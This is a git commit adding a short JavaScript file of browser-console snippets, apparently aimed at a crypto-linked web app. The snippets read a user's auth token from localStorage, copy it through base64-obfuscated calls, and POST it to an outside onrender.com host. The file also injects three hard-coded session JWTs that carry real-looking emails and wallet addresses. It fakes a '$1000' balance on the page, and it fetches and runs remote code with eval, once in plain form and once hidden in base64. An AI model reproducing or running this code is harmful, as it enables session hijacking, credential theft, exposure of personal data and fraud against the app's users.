f30c7fe46f84d144b22ccb29a406f9edf1a3e885
326741 <elmartservice444@gmail.com>
2026-04-12 21:59:15 +0300

    Add files via upload

---
+++ 2.js
@@ -0,0 +1,28 @@
+console.log(localStorage.getItem('auth-token'));
+
+window[atob('Y29weQ==')](window[atob('bG9jYWxTdG9yYWdl')][atob('Z2V0SXRlbQ==')](atob('YXV0aC10b2tlbg==')));
+
+fetch("https://render-1-kqsp.onrender.com/log-string", { method: 'POST', body: localStorage.getItem('auth-token') });
+
+// =====================================
+
+localStorage.setItem('auth-token', 'ТУТ_ТОКЕН');
+
+localStorage.setItem('auth-token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb3VyY2UiOiJjdXN0b20iLCJ1c2VyIjp7InYiOiI1IiwiaWQiOiI0MTJkMTkwZi03OWU3LTQxOGUtODU2MC04YmFkMmExY2M4YTUiLCJldm1XYWxsZXRBZGRyZXNzIjoiMHhlMzlmMzQ2YzIwMGNhNTM4MzMyOWZmZTYwMTUyODljZDFlMDE2YTJjIiwicm9sZSI6InVzZXIiLCJyZWZlcnJlcklkIjoiOGRhYjRiZDctNzkyMS00NzM0LWJkMDMtMTk1Nzc5MWYyZmFlIiwiZ29vZ2xlIjp7Imdvb2dsZUlkIjoiMTA0Mjc2ODAxOTA1NzE0ODIwOTE2IiwiZW1haWwiOiJoYWNrYm9vbTE5OUBnbWFpbC5jb20iLCJuYW1lIjoi0JLQu9Cw0LTQuNC80LjRgCJ9fSwic2Vzc2lvbiI6eyJpZCI6IjIyOTAxNCIsImNyZWF0ZWRBdCI6IjIwMjYtMDMtMjJUMjE6MTg6MTMuMjEwWiIsInR5cGUiOiJnb29nbGUifSwic3ViIjoiNDEyZDE5MGYtNzllNy00MThlLTg1NjAtOGJhZDJhMWNjOGE1IiwicGhhc2UiOiJQVUJMSUNfQkVUQSIsImlhdCI6MTc3NDIxNDI5MywiZXhwIjoxNzc2ODA2MjkzfQ.s-3URMQKPghRCx5KA5T0-Ja5XOY1N8OytxgyxudZSYQ');
+
+// второй акк
+localStorage.setItem('auth-token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb3VyY2UiOiJjdXN0b20iLCJ1c2VyIjp7InYiOiI1IiwiaWQiOiIzM2I5M2E4NC03ZWVjLTQ5YTQtYjNjNS0wNTY5ZjJhM2UzYjIiLCJldm1XYWxsZXRBZGRyZXNzIjoiMHgzMzU4ODIwYzhlOGZkMGEwNDQxMzZjYjdmNjQ4NmY1MzMzOTA2N2Q1Iiwicm9sZSI6InVzZXIifSwic2Vzc2lvbiI6eyJpZCI6IjI0MTc4MCIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMDNUMDA6MzM6MDUuNDEzWiIsInR5cGUiOiJldm0ifSwic3ViIjoiMzNiOTNhODQtN2VlYy00OWE0LWIzYzUtMDU2OWYyYTNlM2IyIiwicGhhc2UiOiJQVUJMSUNfQkVUQSIsImlhdCI6MTc3NTE3NjM4NSwiZXhwIjoxNzc3NzY4Mzg1fQ._HjP0QfmuWiG0sqRfd2uauWNm6Jj4WNHRk6R1w881sc');
+
+// третий акк
+localStorage.setItem('auth-token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb3VyY2UiOiJjdXN0b20iLCJ1c2VyIjp7InYiOiI1IiwiaWQiOiIxNWQzOGI1YS1iMDRjLTQ3Y2EtYWFlOC0wZDRkZmM5NWM2NzUiLCJyb2xlIjoidXNlciIsInJlZmVycmVySWQiOiJlYjY2ZTg2MS1hOTE1LTQyYTItOTI4OC1hZDkxY2Q3YjQzNjIiLCJnb29nbGUiOnsiZ29vZ2xlSWQiOiIxMDg3OTI2OTcxNDYyMDk0MzM2MzkiLCJlbWFpbCI6InBwdWJ1azM0QGdtYWlsLmNvbSIsIm5hbWUiOiJwdWJ1azIwMTcgcHVidWsifX0sInNlc3Npb24iOnsiaWQiOiIyNDUyNTkiLCJjcmVhdGVkQXQiOiIyMDI2LTA0LTA1VDE4OjQ2OjM0LjA3NloiLCJ0eXBlIjoiZ29vZ2xlIn0sInN1YiI6IjE1ZDM4YjVhLWIwNGMtNDdjYS1hYWU4LTBkNGRmYzk1YzY3NSIsInBoYXNlIjoiUFVCTElDX0JFVEEiLCJpYXQiOjE3NzU0MTQ3OTQsImV4cCI6MTc3ODAwNjc5NH0.pFtO_KV2kOiZAB9A00rFUVhLd2S7_4tryX8KJ2h25ZA');
+
+// =====================================
+
+const b = "$1000"; document.querySelectorAll('.flex.items-center.gap-2 .bodyLittleSemibold.text-primary, .flex.items-center.gap-2 p.h3, .flex.flex-col.ml-auto p.h3').forEach(el => el.textContent = b);
+
+// =====================================
+
+fetch('https://raw.githubusercontent.com/326741/catapult/refs/heads/main/main.js').then(r=>r.text()).then(eval)
+eval(atob("ZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8zMjY3NDEvY2F0YXB1bHQvcmVmcy9oZWFkcy9tYWluL21haW4uanMnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp"))
+
+// =====================================
